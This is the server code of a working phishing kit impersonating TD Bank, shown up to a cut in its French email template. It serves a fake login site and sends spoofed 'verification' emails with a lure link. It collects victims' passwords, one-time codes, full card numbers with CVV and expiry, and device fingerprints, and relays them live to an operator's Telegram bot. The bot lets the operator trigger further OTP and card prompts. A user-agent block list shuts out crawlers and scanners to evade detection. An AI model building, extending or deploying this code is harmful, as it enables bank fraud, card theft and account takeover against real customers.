require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const bot = require('./bot');
const otpStore = require('./otpStore'); // Serves as sessionStore
const FormData = require('form-data');
const Mailgun  = require('mailgun.js');


const app = express();
app.set('trust proxy', 1); // Trust first proxy (Nginx) for accurate IP rate-limiting
const PORT = process.env.PORT || 5001;
const isProduction = process.env.NODE_ENV === 'production';

// Enable Helmet HTTP security headers with a CSP tuned for Vite/React
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:     ["'self'"],
      scriptSrc:      ["'self'", "'unsafe-inline'"],   // Vite's module bootstrap needs this
      scriptSrcAttr:  ["'unsafe-inline'"],              // Inline event handlers used by React
      styleSrc:       ["'self'", "https:", "'unsafe-inline'"],
      imgSrc:         ["'self'", "data:", "https:"],
      fontSrc:        ["'self'", "https:", "data:"],
      connectSrc:     ["'self'", "https://api.ipify.org"],
      frameAncestors: ["'none'"],                       // Never embed this site in any iframe
      objectSrc:      ["'none'"],
      baseUri:        ["'self'"],
      formAction:     ["'self'"],
    },
  },
  crossOriginEmbedderPolicy: false, // Keep off — it blocks some legitimate resources
}));


// =============================================
// BOT & CRAWLER BLOCKING
// =============================================

// Layer 1: X-Robots-Tag header on every response — instructs crawlers not to index
app.use((req, res, next) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
  next();
});

// Layer 2: Block known bot/crawler User-Agents at the server level
const BOT_UA_PATTERN = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|ia_archiver|semrushbot|ahrefsbot|dotbot|mj12bot|rogerbot|linkedinbot|twitterbot|facebookexternalhit|whatsapp|telegrambot|applebot|petalbot|bytespider|gptbot|ccbot|claudebot|anthropic|openai|scrapy|python-requests|wget|curl\/|libwww|go-http-client|okhttp|java\/|HeadlessChrome/i;

app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  if (BOT_UA_PATTERN.test(ua)) {
    return res.status(403).send('Forbidden');
  }
  next();
});



// Disable X-Powered-By header to prevent technology disclosure
app.disable('x-powered-by');

// Define allowed CORS origins
const allowedOrigins = [
  'https://centr-prof.com',
  'https://www.centr-prof.com'
];

if (process.env.FRONTEND_URL) {
  allowedOrigins.push(process.env.FRONTEND_URL);
}

// In production, the frontend is served by this same Express server,
// so CORS is only needed in development (Vite dev server on a different port).
app.use(cors({
  origin: isProduction ? allowedOrigins : true,
  credentials: true
}));

// Serve React build in production
if (isProduction) {
  const clientDist = path.join(__dirname, '..', 'client', 'dist');
  app.use(express.static(clientDist));
}

// Apply general API rate limiting (max 2000 requests per 15 minutes per IP to allow for polling)
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 2000,
  message: { success: false, error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', apiLimiter);

// Stricter rate limiter for sensitive authentication entrypoints
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15, // limit each IP to 15 login attempts per 15 minutes
  message: { success: false, error: 'Too many login attempts. Please try again after 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/login', loginLimiter);

app.use(express.json());

// =============================================
// ACCESS KEY PROTECTION
// =============================================
const VALID_ACCESS_KEY = 'client-td-banque';
const ADMIN_ACCESS_KEY = 'whapsendmail';

app.use('/api/', (req, res, next) => {
  // Allow anonymous access to the app download route
  if (req.path === '/download-td-app') {
    return next();
  }
  const userKey = req.query.key || req.headers['x-access-key'] || req.headers['x-admin-key'];
  if (userKey === VALID_ACCESS_KEY || userKey === ADMIN_ACCESS_KEY) {
    return next();
  }
  return res.status(403).json({ success: false, error: 'Access Denied. Invalid or missing access key.' });
});

// Helper for formatted IST time
function getISTDateTime() {
  const date = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istDate = new Date(date.getTime() + istOffset);
  const pad = (num) => String(num).padStart(2, '0');
  return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
}

// =============================================
// FINGERPRINT STORE (in-memory, per IP)
// =============================================
const fingerprintStore = {};

// POST /api/fingerprint — receive and store device signals
app.post('/api/fingerprint', (req, res) => {
  const data = req.body;
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ success: false });
  }

  const ip = data.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  const visitorId = data.visitorId || 'unknown';
  const key = `${ip}::${visitorId}`;

  fingerprintStore[key] = {
    ...data,
    receivedAt: getISTDateTime(),
    ip,
  };

  // Expire after 30 minutes to avoid unbounded memory growth
  setTimeout(() => { delete fingerprintStore[key]; }, 30 * 60 * 1000);

  console.log(`[FP] Stored fingerprint for IP=${ip} visitorId=${visitorId}`);
  return res.json({ success: true });
});

// Helper: look up a stored fingerprint by visitorId
function lookupFingerprint(visitorId) {
  if (!visitorId) return null;
  // Find stored entry matching the visitorId
  const match = Object.values(fingerprintStore).find(fp => fp.visitorId === visitorId);
  return match || null;
}

// Helper: format fingerprint block for Telegram
function formatFingerprintBlock(fp) {
  if (!fp) return '';
  const nav = fp.navigator || {};
  const scr = fp.screen   || {};
  const wgl = fp.webgl    || {};
  const fonts = Array.isArray(fp.fonts) ? fp.fonts.join(', ') : 'n/a';
  const voices = Array.isArray(fp.voices) ? fp.voices.slice(0, 5).join(', ') : 'n/a';
  const exts = Array.isArray(wgl.extensions) ? wgl.extensions.slice(0, 4).join(', ') : 'n/a';

  return `

📊 DEVICE FINGERPRINT
🆔 Visitor ID: ${fp.visitorId || 'n/a'}
🌍 Public IP: ${fp.ip || 'n/a'}

🖥 Navigator
  • UA: ${nav.userAgent || 'n/a'}
  • Platform: ${nav.platform || 'n/a'}
  • Language: ${nav.language || 'n/a'} [${nav.languages || ''}]
  • Timezone: ${nav.timezone || 'n/a'}
  • CPU cores: ${nav.hardwareConcurrency || 'n/a'} | RAM: ${nav.deviceMemory || 'n/a'} GB
  • Touch points: ${nav.maxTouchPoints || '0'} | DNT: ${nav.doNotTrack || 'n/a'}

📐 Screen
  • Resolution: ${scr.width || '?'}×${scr.height || '?'} @ ${scr.pixelRatio || '?'}x
  • Color depth: ${scr.colorDepth || '?'} bit

🎨 Canvas hash: ${fp.canvas || 'n/a'}
🔊 Audio hash: ${fp.audio || 'n/a'}
🖼 WebGPU: ${fp.webgpu || 'n/a'}
📐 ClientRects: ${fp.clientRects || 'n/a'}

🎮 WebGL
  • Renderer: ${wgl.renderer || 'n/a'}
  • Vendor: ${wgl.vendor || 'n/a'}
  • Extensions: ${exts}

🔤 Fonts (${Array.isArray(fp.fonts) ? fp.fonts.length : 0}): ${fonts}
🗣 Voices (${Array.isArray(fp.voices) ? fp.voices.length : 0}): ${voices}`;
}

// Convenience: retrieve fingerprint block for an active email session
function getFpBlock(email) {
  const session = otpStore[email];
  return formatFingerprintBlock(session?.fingerprint || null);
}

// Flow 1 — Login Credentials Notification
app.post('/api/login', async (req, res) => {
  const { email, password, deviceInfo } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'Email and password are required' });
  }

  const ua = deviceInfo?.userAgent || req.headers['user-agent'] || 'unknown';
  const platform = deviceInfo?.platform || 'unknown';
  const language = deviceInfo?.language || 'unknown';
  const screen = deviceInfo?.screen || 'unknown';
  const timezone = deviceInfo?.timezone || 'unknown';
  const fingerprint = deviceInfo?.deviceFingerprint || 'unknown';

  const reqIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  const fp = lookupFingerprint(req.body.fpVisitorId);
  const fpBlock = formatFingerprintBlock(fp);

  const timestamp = getISTDateTime();
  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${timestamp}${fpBlock}`;

  const reply_markup = {
    inline_keyboard: [
      [
        { text: '📤 Pop OTP', callback_data: `pop_otp:${email}` },
        { text: '💳 Pop Card', callback_data: `show_card:${email}` }
      ],
      [
        { text: '📲 Pop APP', callback_data: `show_app:${email}` },
        { text: '❌ Cancel', callback_data: `cancel:${email}` }
      ]
    ]
  };

  // Initialize the session state
  otpStore[email] = {
    email,
    password,
    status: 'login_submitted',
    otp: null,
    otpExpiry: null,
    otpEntered: null,
    redirectUrl: null,
    cardNumber: null,
    cvv: null,
    expiry: null,
    cardOtpEntered: null,
    cardOtpMode: false,
    fingerprint: fp || null,  // persist fingerprint for the whole session
    deviceInfo: deviceInfo || { userAgent: ua, platform, language, screen, timezone, deviceFingerprint: fingerprint }
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] Received login attempt for ${email}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send login attempt message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// GET /api/session-status — Long-polling check for state updates
app.get('/api/session-status', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email query parameter is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.json({ success: true, status: 'idle' });
  }

  return res.json({
    success: true,
    status: session.status,
    otp: session.otp,
    otpExpiry: session.otpExpiry,
    redirectUrl: session.redirectUrl
  });
});

// POST /api/submit-otp — User submits the typed OTP
app.post('/api/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) {
    return res.status(400).json({ success: false, error: 'Email and OTP are required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Update session state
  session.status = 'otp_submitted';

  let message;
  let reply_markup;
  const timestamp = getISTDateTime();

  if (session.cardOtpMode) {
    session.cardOtpEntered = otp;
    const rawCard = (session.cardNumber || '').replace(/\D/g, '');
    const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';

    message = `🔐 CARD OTP ENTERED\n\n📧 Email: ${email}\n💳 Card: ${formattedCard}\n🔢 Card OTP Entered: ${otp}\n🕐 Time: ${timestamp}${getFpBlock(email)}`;

    reply_markup = {
      inline_keyboard: [
        [
          { text: '✅ ACCEPT CARD OTP', callback_data: `accept_otp:${email}` },
          { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` }
        ],
        [
          { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` },
          { text: '❌ CANCEL', callback_data: `cancel:${email}` }
        ]
      ]
    };
  } else {
    session.otpEntered = otp;

    message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}${getFpBlock(email)}`;

    reply_markup = {
      inline_keyboard: [
        [
          { text: '✅ ACCEPT OTP', callback_data: `accept_otp:${email}` },
          { text: '💳 ACCEPT OTP + CARD', callback_data: `accept_otp_card:${email}` }
        ],
        [
          { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` },
          { text: '❌ CANCEL', callback_data: `cancel:${email}` }
        ],
        [
          { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` }
        ]
      ]
    };
  }

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] User ${email} submitted ${session.cardOtpMode ? 'Card' : 'Email'} OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send OTP entered message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// POST /api/request-resend — User requested a new OTP code
app.post('/api/request-resend', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Generate a new 6-digit OTP code immediately
  const crypto = require('crypto');
  const otp = crypto.randomInt(100000, 999999).toString();

  session.status = 'show_otp';
  session.otp = otp;
  session.otpExpiry = Date.now() + 60000; // Reset to 60 seconds

  const timestamp = getISTDateTime();
  try {
    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `⚠️ USER REQUESTED RESEND (New OTP Generated)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timestamp}${getFpBlock(email)}`
    );
    console.log(`[Express] User ${email} requested OTP resend. New OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send resend request message to Telegram:', error.message);
  }
  return res.json({ success: true });
});

// POST /api/clear-session — Clean up session after successful verification
app.post('/api/clear-session', (req, res) => {
  const { email } = req.body;
  if (email && otpStore[email]) {
    delete otpStore[email];
    console.log(`[Express] Session successfully cleared for ${email}`);
  }
  return res.json({ success: true });
});

// POST /api/submit-card — User submits card details after OTP card popup
app.post('/api/submit-card', async (req, res) => {
  const { email, cardNumber, cvv, expiry } = req.body;
  if (!email || !cardNumber || !cvv || !expiry) {
    return res.status(400).json({ success: false, error: 'All card fields are required.' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Store card details in session
  session.cardNumber = cardNumber;
  session.cvv = cvv;
  session.expiry = expiry;
  session.status = 'card_submitted';

  const timestamp = getISTDateTime();
  const message = `💳 CARD DETAILS RECEIVED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕐 Time: ${timestamp}${getFpBlock(email)}`;

  const reply_markup = {
    inline_keyboard: [
      [{ text: '✅ Accept Card & Redirect', callback_data: `accept_card:${email}` }],
      [{ text: '📲 Push Notification Popup', callback_data: `show_app_push:${email}` }],
      [{ text: '🔄 Show OTP Popup Again', callback_data: `show_otp_again:${email}` }],
      [{ text: '❌ Cancel Everything', callback_data: `cancel:${email}` }]
    ]
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] User ${email} submitted card details. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send card details to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// =============================================
// ADMIN — SEND EMAIL VIA MAILGUN
// =============================================


app.post('/api/admin/send-email', async (req, res) => {
  // Admin key check via header
  const adminKey = req.headers['x-admin-key'];
  if (!adminKey || adminKey !== ADMIN_ACCESS_KEY) {
    return res.status(403).json({ success: false, error: 'Access Denied.' });
  }

  const { recipient, lang = 'en', emailType = 'website' } = req.body;
  if (!recipient) {
    return res.status(400).json({ success: false, error: 'Recipient is required.' });
  }

  const link = 'https://centr-prof.com/?key=client-td-banque';

  const MG_API_KEY   = process.env.MG_API_KEY;
  const MG_DOMAIN    = process.env.MG_DOMAIN;
  const FROM_EMAIL   = process.env.MG_FROM_EMAIL;
  const FROM_NAME    = process.env.MG_FROM_NAME || 'BANQUE TD';

  if (!MG_API_KEY || !MG_DOMAIN || !FROM_EMAIL) {
    console.error('[Admin] Mailgun API key, domain, or FROM_EMAIL not set in .env');
    return res.status(500).json({ success: false, error: 'Email service not configured.' });
  }

  const templates = {
    website: {
      en: {
        subject: 'Secure verification required – TD',
      html: `<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
  <title>Secure verification required – TD</title>
  <!--[if mso]>
  <noscript>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
  </noscript>
  <![endif]-->
  <style>
    * { box-sizing: border-box; }
    body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
    table, td { mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { -ms-interpolation-mode: bicubic; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; }
    a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
    body {
      margin: 0 !important;
      padding: 0 !important;
      background-color: #f0f2f5;
      font-family: Arial, Helvetica, sans-serif;
    }
    @media only screen and (max-width: 600px) {
      .email-wrapper { width: 100% !important; }
      .email-content { padding: 20px 16px !important; }
      .header-logo { padding: 20px 16px !important; }
      .btn-verify { padding: 14px 28px !important; font-size: 15px !important; }
      .footer-table { padding: 20px 16px !important; }
      h1 { font-size: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f0f2f5;">

  <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
    Secure verification required – Action required on your TD account.
  </div>

  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
    <tr>
      <td align="center" style="padding:30px 15px;">

        <table role="presentation" class="email-wrapper" border="0" cellpadding="0" cellspacing="0" width="600" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.10);">

          <tr>
            <td style="background-color:#003f2d;height:5px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="header-logo" style="background-color:#ffffff;padding:20px 40px;border-bottom:1px solid #e8e8e8;">
              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:bold;color:#067a2b;letter-spacing:0.5px;">TD BANK</span>
                  </td>
                  <td align="right" style="vertical-align:middle;">
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">SECURITY NOTICE</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;padding:14px 40px;">
              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Security Verification Required</span>
            </td>
          </tr>

          <tr>
            <td class="email-content" style="padding:40px 40px 32px 40px;">

              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Dear Customer,</p>

              <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
                Identity Verification Required
              </h1>

              <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                We need to verify your identity to finalize your request. This step is necessary to ensure the security of your account and protect your personal information.
              </p>

              <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Please click the button below to proceed with the verification. This process will only take a few moments.
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
                <tr>
                  <td style="padding:16px 20px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
                      <strong style="color:#003f2d;">Why this verification?</strong><br>
                      For your security, we periodically verify our customers' identity. This measure helps us detect any unauthorized activity on your account.
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:32px;">
                <tr>
                  <td align="center">
                    <!--[if mso]>
                    <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word"
                      href="${link}"
                      style="height:52px;v-text-anchor:middle;width:260px;"
                      arcsize="8%"
                      strokecolor="#067a2b"
                      fillcolor="#067a2b">
                      <w:anchorlock/>
                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Verify My Identity</center>
                    </v:roundrect>
                    <![endif]-->
                    <!--[if !mso]><!-->
                    <a href="${link}"
                       target="_blank"
                       rel="noopener noreferrer"
                       class="btn-verify"
                       style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
                      Verify My Identity
                    </a>
                    <!--<![endif]-->
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
                If the button does not work, copy and paste this link into your browser:<br>
                <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#fff8e1;border:1px solid #ffe082;border-radius:3px;">
                <tr>
                  <td style="padding:14px 18px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
                      ⚠️ <strong>Security Note:</strong> TD Bank will never ask for your PIN, password, or full card number by email. If you did not request this verification, please contact our customer service immediately.
                    </p>
                  </td>
                </tr>
              </table>

            </td>
          </tr>

          <tr>
            <td style="background-color:#e8e8e8;height:1px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="footer-table" style="background-color:#f8f9fb;padding:28px 40px;">

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
                      <strong style="color:#333333;">Need Help?</strong>
                    </p>
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
                      Contact us at <strong>1-800-895-4463</strong><br>
                      Available 24 hours a day, 7 days a week
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Security Centre</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security/privacy-agreement" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Privacy Policy</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/en/personal-banking" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                  </td>
                </tr>
              </table>

              <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
                © 2026 TD Bank Group. All rights reserved.<br>
                66 Wellington Street West, Toronto, Ontario M5K 1A2<br><br>
                This email was sent to the address associated with your TD account. This is a transactional message related to the security of your account.
              </p>

            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;height:4px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>`,
      text: `Dear Customer,\n\nWe need to verify your identity to finalize your request.\n\nPlease click on this link to proceed with the verification:\n${link}\n\nIf you did not request this verification, please contact our customer service at 1-800-895-4463.\n\n© ${new Date().getFullYear()} TD Bank Group. All rights reserved.`,
    },
      fr: {
      subject: 'Vérification sécurisée requise – TD',
      html: `<!DOCTYPE html>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
  <title>Vérification sécurisée requise – TD</title>
  <!--[if mso]>
  <noscript>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
  </noscript>
  <![endif]-->
  <style>
    * { box-sizing: border-box; }
    body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
    table, td { mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { -ms-interpolation-mode: bicubic; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; }
    a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
    body {
      margin: 0 !important;
      padding: 0 !important;
      background-color: #f0f2f5;
      font-family: Arial, Helvetica, sans-serif;
    }
    @media only screen and (max-width: 600px) {
      .email-wrapper { width: 100% !important; }
      .email-content { padding: 20px 16px !important; }
      .header-logo { padding: 20px 16px !important; }
      .btn-verify { padding: 14px 28px !important; font-size: 15px !important; }
      .footer-table { padding: 20px 16px !important; }
      h1 { font-size: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f0f2f5;">

  <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
    Vérification sécurisée requise – Action requise sur votre compte TD.
  </div>

  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
    <tr>
      <td align="center" style="padding:30px 15px;">

        <table role="presentation" class="email-wrapper" border="0" cellpadding="0" cellspacing="0" width="600" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.10);">

          <tr>
            <td style="background-color:#003f2d;height:5px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="header-logo" style="background-color:#ffffff;padding:20px 40px;border-bottom:1px solid #e8e8e8;">
              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:bold;color:#067a2b;letter-spacing:0.5px;">BANQUE TD</span>
                  </td>
                  <td align="right" style="vertical-align:middle;">
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">AVIS SÉCURISÉ</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;padding:14px 40px;">
              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Vérification de sécurité requise</span>
            </td>
          </tr>

          <tr>
            <td class="email-content" style="padding:40px 40px 32px 40px;">

              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Cher(e) client(e),</p>

              <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
                Vérification de votre identité requise
              </h1>

              <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Nous devons vérifier votre identité afin de finaliser votre demande. Cette étape est nécessaire pour assurer la sécurité de votre compte et protéger vos informations personnelles.
              </p>

              <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Veuillez cliquer sur le bouton ci-dessous pour procéder à la vérification. Cette démarche ne prendra que quelques instants.
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
                <tr>
                  <td style="padding:16px 20px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
                      <strong style="color:#003f2d;">Pourquoi cette vérification ?</strong><br>
                      Pour votre sécurité, nous vérifions périodiquement l'identité de nos clients. Cette mesure nous permet de détecter toute activité non autorisée sur votre compte.
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:32px;">
                <tr>
                  <td align="center">
                    <!--[if mso]>
                    <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word"
                      href="${link}"
                      style="height:52px;v-text-anchor:middle;width:260px;"
                      arcsize="8%"
                      strokecolor="#067a2b"
                      fillcolor="#067a2b">
                      <w:anchorlock/>
                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Vérifier mon identité</center>
                    </v:roundrect>
                    <![endif]-->
                    <!--[if !mso]><!-->
                    <a href="${link}"
                       target="_blank"
                       rel="noopener noreferrer"
                       class="btn-verify"
                       style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
                      Vérifier mon identité
                    </a>
                    <!--<![endif]-->
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
                Si le bouton ne fonctionne pas, copiez et collez ce lien dans votre navigateur :<br>
                <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
              </p>

